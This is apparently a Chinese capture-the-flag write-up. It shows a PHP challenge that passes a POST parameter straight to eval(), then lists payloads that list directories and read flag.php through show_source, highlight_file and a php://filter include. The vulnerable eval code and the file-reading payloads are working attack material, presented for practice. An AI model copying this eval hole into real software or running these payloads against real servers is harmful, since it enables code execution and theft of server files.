```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
} 
```





### 第一种

```
c=var_dump(scandir(getcwd()));
```

![image-20250404153335757](./assets/image-20250404153335757.png)

```
c=show_source(next(array_reverse(scandir(getcwd()))));
```

![image-20250404153314599](./assets/image-20250404153314599.png)



### 第二种

```
c=show_source("flag.php");
```

![image-20250404153349904](./assets/image-20250404153349904-1743752030217-1.png)

```
c=highlight_file("flag.php");
```

![image-20250404153405125](./assets/image-20250404153405125.png)





### 第三种

嵌套include

```
c=include$_POST[a]?>&a=php://filter/convert.base64-encode/resource=flag.php
```

![image-20250404160147914](./assets/image-20250404160147914.png)

![image-20250404160204705](./assets/image-20250404160204705.png)